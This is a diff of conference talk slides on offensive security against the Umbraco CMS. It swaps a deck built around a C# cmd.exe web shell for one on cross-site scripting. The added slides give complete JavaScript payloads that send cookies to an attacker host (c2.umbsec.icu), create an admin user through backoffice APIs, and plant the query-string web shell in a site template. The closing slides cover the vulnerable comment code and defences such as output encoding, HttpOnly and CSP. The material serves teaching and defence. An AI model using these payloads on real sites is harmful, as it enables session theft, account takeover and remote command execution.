@@ -31,8 +31,8 @@
 		<div class="slides">
 			<section data-background-color="#1a242f" data-background-image="img/BG.svg" data-background-size="700px"
 				data-background-repeat="repeat" data-background-opacity="0.5">
-				<h1 class="mono">🤬<br>Offensive Umbraco</h1>
-				<p>Notes of a Friendly Adversary</p>
+				<h2 class="mono">🤬<br>Offensive Umbraco: The Prequel</h2>
+				<p>The Power of XSS</p>
 				<small>Steven Harland</small>
 			</section>
 
@@ -41,260 +41,211 @@
 				<ul>
 					<li>Security Analyst @ Quorum Cyber</li>
 					<li>Former Developer @ Intelligent Mobile</li>
-					<li>Umbraco Expert, eJPT, OSCP, CRTP, OMG/WTF</li>
+					<li>Former Umbraco Master</li>
+					<li>CG21 Speaker</li>
 				</ul>
 			</section>
 
-			<!-- Offensive Security -->
-
-			<section data-background-color="#1a242f" data-background-image="img/BG.svg" data-background-size="700px"
-				data-background-repeat="repeat" data-background-opacity="0.5">
-				<h2 class="r-fit-text mono">❓❔<br>Offensive Security</h2>
-			</section>
-
 			<section>
-				<h3>What is Offensive Security? 🏹</h3>
+				<h3>Codegarden 2021 😱</h3>
 				<ul>
-					<li>An adversarial approach to security</li>
+					<li>Introduction to Offensive Security</li>
+					<li>Backoffice "assumed breach" scenario</li>
 					<li>
-						Simulating real-world attacks with the same tactics and techniques as real threat actors
-						<ul>
-							<li class="fragment">...within agreed scope!</li>
-						</ul>
+						<a href="https://youtu.be/l2HhURPOMi0">
+							https://youtu.be/l2HhURPOMi0
+						</a>
 					</li>
-					<li class="fragment">End goal = better defences</li>
 				</ul>
 			</section>
 
-			<section>
-				<h3>Adversary Mindset 🧠</h3>
-				<ul>
-					<li>How can I leverage [thing] for malicious purposes?</li>
-					<li>Feature abuse/misuse</li>
-				</ul>
-			</section>
-
-			<!-- Offensive Umbraco -->
+			<!-- Initial Access 🔑 -->
 
 			<section data-background-color="#1a242f" data-background-image="img/BG.svg" data-background-size="700px"
 				data-background-repeat="repeat" data-background-opacity="0.5">
-				<h2 class="r-fit-text mono">🤬<br>Offensive Umbraco</h2>
+				<h3 class="r-fit-text mono">Initial Access 🔑</h3>
 			</section>
 
 			<section>
-				<h3>Demo Environment</h3>
-				<img class="r-stretch" src="img/DemoEnvironment.svg" alt="Demo Environment">
-			</section>
-
-			<section>
-				<h2>Scenario</h2>
+				<h4>Initial Access 🔑</h4>
 				<ul>
-					<li>You have compromised an Umbraco <em>editor</em> login</li>
+					<li>Weak passwords</li>
+					<li>Brute forcing</li>
+					<li>Leaked credentials</li>
+					<li>Phishing</li>
+					<li>Social engineering</li>
+					<li>Insider threat</li>
 					<li>
-						Your objectives are:
+						Exploiting vulnerabilities
 						<ul>
-							<li>Gain access to an admin account</li>
-							<li>Deploy a C2 implant to the hosting server</li>
+							<li>In Umbraco core or packages</li>
+							<li><em>On the front-end</em></li>
 						</ul>
 					</li>
-				</ul>
-			</section>
-
-			<!-- Information Gathering 🔍 -->
-
-			<section data-background-color="#1a242f" data-background-image="img/BG.svg" data-background-size="700px"
-				data-background-repeat="repeat" data-background-opacity="0.5">
-				<h3 class="r-fit-text mono">Information Gathering 🔍</h3>
-			</section>
-
-			<section>
-				<h4>Information Gathering 🔍</h4>
-				<ul>
-					<li>What role are we?</li>
-					<li>What capabilities do we have?</li>
-					<li>What data do we have access to?</li>
-					<li>What version of Umbraco are we on?</li>
-					<li>What packages are installed?</li>
-					<li>How has the backoffice been extended?</li>
-					<li>Can we deploy to other environments?</li>
+					<li>...</li>
 				</ul>
 			</section>
 
 			<section>
-				<h4>Enumeration: Backoffice Requests</h4>
-				<img src="img/BackofficeRequests.png" alt="Backoffice Requests">
+				<h4 class="r-fit-text">Demo: Cross-Site Scripting (XSS)</h4>
 			</section>
 
 			<section>
-				<h4>Enumeration: Server Variables</h4>
-				<img src="img/ServerVariables.png" alt="Server Variables">
-			</section>
-
-			<section data-background-color="#1a242f" data-background-image="img/BG.svg" data-background-size="700px"
-				data-background-repeat="repeat" data-background-opacity="0.5">
-				<h3 class="r-fit-text mono">
-					Privilege Escalation 📈
-				</h3>
-			</section>
-
-			<section>
-				<h4>Demo: Vulnerable Backoffice Extension 🚨</h4>
-				<ul>
-					<li>PDF export feature</li>
-					<li>PDF is generated from HTML template</li>
-					<li>Editor has control over HTML</li>
-				</ul>
-			</section>
-
-			<!-- Execution 👨‍💻 -->
-
-			<section data-background-color="#1a242f" data-background-image="img/BG.svg" data-background-size="700px"
-				data-background-repeat="repeat" data-background-opacity="0.5">
-				<h3 class="r-fit-text mono">
-					Code Execution 🚀
-				</h3>
-			</section>
-
-			<section>
-				<h4>Code Execution 🚀</h4>
-				<ul>
-					<li>Executing malicious code within the context of the target application</li>
-					<li>In Umbraco this means C#/.NET and will require getting code into one of these locations:
-						<ul>
-							<li><em>~/bin/</em> (compiled)</li>
-							<li><em>~/Views/</em></li>
-							<li><em>~/App_Code/</em></li>
-							<li><em>*.aspx</em></li>
-						</ul>
-					</li>
-				</ul>
-			</section>
-
-			<section>
-				<h4>Code Execution 🚀</h4>
-				<ul>
-					<li>
-						Trivial with an admin account
-						<ul>
-							<li>Upload packages</li>
-							<li>Create/edit views</li>
-						</ul>
-					</li>
-					<li>
-						Other possible methods:
-						<ul>
-							<li>
-								File upload exploitation:
-								<a href="https://donutsec.fun/blog/ource/">
-									https://donutsec.fun/blog/ource/
-								</a>
-							</li>
-							<li>Supply chain attack</li>
-							<li>Template injection</li>
-						</ul>
-					</li>
-				</ul>
-			</section>
-
-			<section>
-				<h4>Command Execution 👨‍💻</h4>
-				<ul>
-					<li>Executing <em>commands</em> on the underlying operating system</li>
-					<li>We leverage <em>code</em> execution and features of the .NET Framework</li>
-				</ul>
-			</section>
-
-			<section>
-				<h4>Demo: Web Shell</h4>
+				<h4>Cookie Grabber</h4>
 				<pre>
-					<code data-trim data-line-numbers="5|1,7-9|10-12|13-16|19">
-						@if (!string.IsNullOrEmpty(Request.QueryString["cmd"]))
-						{
-								try
-								{
-										using (var process = new System.Diagnostics.Process())
-										{
-												process.StartInfo.FileName = "cmd.exe";
-												process.StartInfo.Arguments =
-														"/c " + Request.QueryString["cmd"];
-												process.StartInfo.CreateNoWindow = true;
-												process.StartInfo.RedirectStandardOutput = true;
-												process.StartInfo.UseShellExecute = false;
-												process.Start();
-												var output = process.StandardOutput.ReadToEnd();
-												process.WaitForExit();
-												&lt;pre&gt;@output&lt;/pre&gt;
-										}
-								}
-								catch { }
-						}
+					<code data-trim>
+						&lt;script&gt;
+							fetch('https://c2.umbsec.icu/', {
+								method: 'POST',
+								body: document.cookie
+							});
+						&lt;/script&gt;
 					</code>
 				</pre>
 			</section>
 
 			<section>
-				<h5>Web Shell Issues 🤔</h5>
-				<ul>
-					<li>Not exactly hidden from backoffice users</li>
-					<li>View may be overwritten on deployment</li>
-					<li>
-						Noisy
-						<ul>
-							<li>Requires repeated HTTP requests to execute multiple commands</li>
-							<li>Repeatedly spawns new server-side processes</li>
-						</ul>
-					</li>
-					<li>Query strings appear in IIS logs</li>
-				</ul>
-				<img class="r-stretch" src="img/CmdLogs.png">
-			</section>
-
-			<!-- Command &amp; Control 🎮 -->
-
-			<section data-background-color="#1a242f" data-background-image="img/BG.svg" data-background-size="700px"
-				data-background-repeat="repeat" data-background-opacity="0.5">
-				<h3 class="r-fit-text mono">
-					Command &amp; Control 🎮
-				</h3>
+				<h4>Cookie Grabber Operation</h4>
+				<img class="r-stretch" src="img/CookieGrabber.svg" alt="Cookie Grabber">
 			</section>
 
 			<section>
-				<h4>Command &amp; Control (C2)</h4>
-				<img class="r-stretch" src="img/C2.svg" alt="C2">
-			</section>
-
-			<section>
-				<h4>C2 Frameworks 🏗️</h4>
-				<ul>
-					<li>Cobalt Strike</li>
-					<li>PowerShell Empire</li>
-					<li>Covenant</li>
-					<li>Apfell</li>
-					<li>PoshC2</li>
-					<li>...</li>
-				</ul>
+				<h4>Trying Harder 🎨</h4>
 				<p>
-					<small>
-						<a href="https://www.thec2matrix.com/">
-							https://www.thec2matrix.com/
-						</a>
-					</small>
+					We can call any <em>backoffice</em> API from JavaScript code on the <em>front-end</em> of a site provided:
+					<ol>
+						<li>The backoffice and front-end are hosted on the same domain</li>
+						<li>The user viewing the front-end is currently logged into the backoffice</li>
+						<li>The user has permission to call the API in question</li>
+					</ol>
 				</p>
 			</section>
 
 			<section>
-				<h4>Demo: PoshC2 Deployment</h4>
-				<img class="r-stretch" src="img/C2Deployment.svg" alt="C2 Deployment">
-				<p>
-					<small>
-						<a href="https://github.com/nettitude/PoshC2">
-							https://github.com/nettitude/PoshC2
-						</a>
-					</small>
-				</p>
+				<h4>XSS ➡ Umbraco Admin</h4>
+				<pre>
+					<code data-trim data-line-numbers="3-10|12-16|17|19|24-28">
+						&lt;script&gt;
+							(async function () {
+								// Object representing the new user
+								const data = {
+									id: -1,
+									parentId: -1,
+									name: 'TestUser',
+									email: 'test@web.umbsec.icu',
+									userGroups: ['admin']
+								};
+						
+								// Call create user API
+								const response = await fetch(
+									'/umbraco/backoffice/UmbracoApi/Users/PostCreateUser', {
+										method: 'POST',
+										body: JSON.stringify(data),
+										credentials: 'include',
+										headers: {
+											'x-umb-xsrf-token': getCookie('UMB-XSRF-TOKEN'),
+											'Content-Type': 'application/json',
+										}
+								});
+						
+								// Send response to attack server
+								await fetch('https://c2.umbsec.icu/', {
+									method: 'POST',
+									body: await response.text()
+								});
+							})();
+						
+							function getCookie(name) {
+								return document.cookie.match('(^|;)\\s*'
+									+ name + '\\s*=\\s*([^;]+)')?.pop() || '';
+							}
+						&lt;/script&gt;
+					</code>
+				</pre>
 			</section>
 
-			<!-- Defensive Umbraco -->
+			<section>
+				<h4>XSS ➡ RCE</h4>
+				<pre>
+					<code data-trim>
+						&lt;script&gt;
+							(async function () {
+								const payload = `
+						
+						@if (!string.IsNullOrEmpty(Request.QueryString["cmd"]))
+						{
+							try
+							{
+								using (var process = new System.Diagnostics.Process())
+								{
+									process.StartInfo.FileName = "cmd.exe";
+									process.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
+									process.StartInfo.CreateNoWindow = true;
+									process.StartInfo.RedirectStandardOutput = true;
+									process.StartInfo.UseShellExecute = false;
+									process.Start();
+									var output = process.StandardOutput.ReadToEnd();
+									process.WaitForExit();
+									<pre>@output</pre>
+								}
+							}
+							catch { }
+						}
+						`;
+						
+								// Get all templates
+								const allTemplatesResponse = await fetch(
+									'/umbraco/backoffice/UmbracoApi/Template/GetAll', {
+									method: 'GET',
+									credentials: 'include',
+									headers: {
+										'x-umb-xsrf-token': getCookie('UMB-XSRF-TOKEN')
+									}
+								});
+								const allTemplates = JSON.parse((await allTemplatesResponse.text()).slice(6));
+						
+								// Get home template
+								const homeTemplateStub = allTemplates.find(x => x.name.includes('Home'));
+								const homeTemplateResponse = await fetch(
+									'/umbraco/backoffice/UmbracoApi/Template/GetById?id=' + homeTemplateStub.id, {
+									method: 'GET',
+									credentials: 'include',
+									headers: {
+										'x-umb-xsrf-token': getCookie('UMB-XSRF-TOKEN')
+									}
+								});
+								const homeTemplate = JSON.parse((await homeTemplateResponse.text()).slice(6));
+						
+								// Add payload
+								homeTemplate.content = homeTemplate.content + payload;
+						
+								// Save template
+								const response = await fetch(
+									'/umbraco/backoffice/UmbracoApi/Template/PostSave', {
+									method: 'POST',
+									body: JSON.stringify(homeTemplate),
+									credentials: 'include',
+									headers: {
+										'x-umb-xsrf-token': getCookie('UMB-XSRF-TOKEN'),
+										'Content-Type': 'application/json',
+									}
+								});
+						
+								// Send response to attack server
+								await fetch('https://c2.umbsec.icu/', {
+									method: 'POST',
+									body: await response.text()
+								});
+							})();
+						
+							function getCookie(name) {
+								return document.cookie.match('(^|;)\\s*'
+									+ name + '\\s*=\\s*([^;]+)')?.pop() || '';
+							}
+						&lt;/script&gt;
+					</code>
+				</pre>
+			</section>
 
 			<section data-background-color="#1a242f" data-background-image="img/BG.svg" data-background-size="700px"
 				data-background-repeat="repeat" data-background-opacity="0.5">
@@ -302,66 +253,99 @@
 			</section>
 
 			<section>
-				<h3 class="r-fit-text">Backoffice features &amp; permissions 🔏</h3>
-				<ul>
-					<li>
-						Use principle of least privilege
-					</li>
-					<li>
-						Carefully consider every feature you provide to editors
-						<ul>
-							<li>You may be providing the same features to attackers</li>
-						</ul>
-					</li>
-					<li>
-						Apply adversary mindset to <em>everything</em>
-						<ul>
-							<li>Treat everything as a potential route to compromise!</li>
-						</ul>
-					</li>
-					<li>
-						Penetration testing/code reviews of backoffice extensions
-					</li>
-				</ul>
+				Why the demo is vulnerable:
+				<pre>
+					<code data-trim>
+						// BlogCommentSurfaceController.cs
+						[HttpPost]
+						[ValidateUmbracoFormRouteString]
+						public ActionResult SubmitComment(CommentViewModel viewModel)
+						{
+							if (!ModelState.IsValid)
+							{
+								return CurrentUmbracoPage();
+							}
+				
+							using (var scope = _scopeProvider.CreateScope())
+							{
+								var model = new BlogCommentSchema
+								{
+									BlogPostUmbracoId = CurrentPage.Id,
+									Name = viewModel.Name,
+									Message = viewModel.Message
+								};
+								scope.Database.Insert(model);
+								scope.Complete();
+							}
+				
+							return RedirectToCurrentUmbracoPage();
+						}
+					</code>
+				</pre>
 			</section>
 
 			<section>
-				<h3>File &amp; folder permissions 📂</h3>
+				Why the demo is vulnerable:
+				<pre>
+					<code data-trim>
+						// CommentViewModel.cs
+						[AllowHtml]
+						public string Message { get; set; }
+					</code>
+				</pre>
+				<pre>
+					<code data-trim>
+						// Comment.cshtml
+						@Html.Raw(Model.Message)
+					</code>
+				</pre>
+				<small>This is just <em>one</em> example of how XSS can arise.</small>
+			</section>
+
+			<section>
+				<h4>XSS Prevention 🚫</h4>
 				<ul>
-					<li>Write access only for necessary folders to prevent executable files being written</li>
-					<li>
-						If template editing/package management in the backoffice is required then implement stricter controls in other areas
-					</li>
+					<li>Validate input</li>
+					<li>Sanitise input</li>
+					<li>Encode output</li>
 				</ul>
 				<p>
 					<small>
-						<a href="https://our.umbraco.com/Documentation/Fundamentals/Setup/Server-Setup/permissions">
-							https://our.umbraco.com/Documentation/Fundamentals/Setup/Server-Setup/permissions
+						<a href="https://portswigger.net/web-security/cross-site-scripting/preventing">
+							https://portswigger.net/web-security/cross-site-scripting/preventing
 						</a>
 					</small>
 				</p>
 			</section>
 
 			<section>
-				<h3>Application Pools 🥽</h3>
+				<h4>Safety Nets 🥅</h4>
 				<ul>
-					<li>Separate user for each website to prevent lateral movement</li>
+					<li>Host the backoffice and front end on separate domains</li>
+					<li>Set the HttpOnly flag on your cookies</li>
+					<li>Define a Content Security Policy</li>
 				</ul>
 			</section>
 
 			<section>
-				<h4>Defence in Depth 🥞</h4>
+				<h4>Content Security Policy 🚓</h4>
 				<ul>
-					<li>Website front-end</li>
-					<li>Backoffice login</li>
-					<li>Backoffice features &amp; permissions</li>
-					<li>File &amp; folder permissions</li>
-					<li>Application pools</li>
-					<li>Server</li>
-					<li>Firewall</li>
-					<li>...</li>
-					<li>You?</li>
+					<li>HTTP header or meta tag</li>
+					<li>Tells browsers where it's safe to load resources from</li>
 				</ul>
+				<pre>
+					<code data-trim>
+						Content-Security-Policy: connect-src 'self';
+					</code>
+				</pre>
+				<img class="r-stretch" src="img/CSP.png" alt="CSP Violation">
+				<p>
+					<small>
+						<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src">
+							https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src
+						</a>
+					</small>
+				</p>
 			</section>
 
 			<section data-background-color="#1a242f" data-background-image="img/BG.svg" data-background-size="700px"
